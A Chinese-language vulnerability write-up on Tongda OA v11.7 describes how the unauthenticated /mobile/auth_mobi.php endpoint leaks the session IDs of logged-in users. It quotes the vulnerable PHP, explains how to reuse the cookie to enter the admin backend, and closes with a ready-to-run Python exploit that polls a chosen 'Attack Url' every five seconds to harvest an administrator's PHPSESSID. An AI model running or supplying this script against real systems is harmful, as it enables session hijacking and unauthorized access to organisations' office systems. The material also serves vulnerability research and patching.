# 通达OA v11.7 在线用户登录漏洞

## 漏洞描述

通达OA v11.7 中存在某接口查询在线用户，当用户在线时会返回 PHPSESSION使其可登录后台系统

## 漏洞影响

> [!NOTE]
>
> 通达OA < v11.7 

## 环境搭建

[通达OA v11.7下载链接](https://cdndown.tongda2000.com/oa/2019/TDOA11.7.exe)

下载后按步骤安装即可

## 漏洞复现

漏洞有关文件 **MYOA\webroot\mobile\auth_mobi.php**

```php
<?php

function relogin()
{
    echo _('RELOGIN');
    exit;
}
ob_start();
include_once 'inc/session.php';
include_once 'inc/conn.php';
include_once 'inc/utility.php';
if ($isAvatar == '1' && $uid != '' && $P_VER != '') {
    $sql = 'SELECT SID FROM user_online WHERE UID = \'' . $uid . '\' and CLIENT = \'' . $P_VER . '\'';
    $cursor = exequery(TD::conn(), $sql);
    if ($row = mysql_fetch_array($cursor)) {
        $P = $row['SID'];
    }
}
if ($P == '') {
    $P = $_COOKIE['PHPSESSID'];
    if ($P == '') {
        relogin();
        exit;
    }
}
if (preg_match('/[^a-z0-9;]+/i', $P)) {
    echo _('非法参数');
    exit;
}
if (strpos($P, ';') !== false) {
    $MY_ARRAY = explode(';', $P);
    $P = trim($MY_ARRAY[1]);
}
session_id($P);
session_start();
session_write_close();
if ($_SESSION['LOGIN_USER_ID'] == '' || $_SESSION['LOGIN_UID'] == '') {
    relogin();
}
```

在执行的 SQL语句中

```sql
$sql = 'SELECT SID FROM user_online WHERE UID = \'' . $uid . '\' and CLIENT = \'' . $P_VER . '\'';
```

![](image/tongdaoa-25.png)

简单阅读PHP源码可以知道 此SQL语句会查询用户是否在线，如在线返回此用户 Session ID

![](image/tongdaoa-26.png)

将返回的 Set-Cookie 中的Cookie参数值使用于登录Cookie

访问目标后台 http://xxx.xxx.xxx.xxx/general/ 

![](image/tongdaoa-27.png)

当目标离线时则访问漏洞页面则会出现如下图

![](image/tongdaoa-28.png)

> [!NOTE]
>
> 通过此思路可以持续发包监控此页面来获取在线用户的Cookie

## 漏洞利用POC

> [!NOTE]
>
> 5秒一次测试用户是否在线

```python
import requests
import sys
import random
import re
import time
from requests.packages.urllib3.exceptions import InsecureRequestWarning

def title():
    print('+------------------------------------------')
    print('+  \033[34mPOC_Des: http://wiki.peiqi.tech                                   \033[0m')
    print('+  \033[34mVersion: 通达OA 11.7                                               \033[0m')
    print('+  \033[36m使用格式:  python3 poc.py                                            \033[0m')
    print('+  \033[36mUrl         >>> http://xxx.xxx.xxx.xxx                             \033[0m')
    print('+------------------------------------------')

def POC_1(target_url):
    vuln_url = target_url + "/mobile/auth_mobi.php?isAvatar=1&uid=1&P_VER=0"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
    }
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5)
        if "RELOGIN" in response.text and response.status_code == 200:
            print("\033[31m[x] 目标用户为下线状态 --- {}\033[0m".format(time.asctime( time.localtime(time.time()))))
        elif response.status_code == 200 and response.text == "":
            PHPSESSION = re.findall(r'PHPSESSID=(.*?);', str(response.headers))
            print("\033[32m[o] 用户上线 PHPSESSION: {} --- {}\033[0m".format(PHPSESSION[0] ,time.asctime(time.localtime(time.time()))))
        else:
            print("\033[31m[x] 请求失败，目标可能不存在漏洞")
            sys.exit(0)
    except Exception as e:
        print("\033[31m[x] 请求失败 \033[0m", e)


if __name__ == '__main__':
    title()
    target_url = str(input("\033[35mPlease input Attack Url\nUrl >>> \033[0m"))
    while True:
        POC_1(target_url)
        time.sleep(5)
```

![](image/tongdaoa-29.png)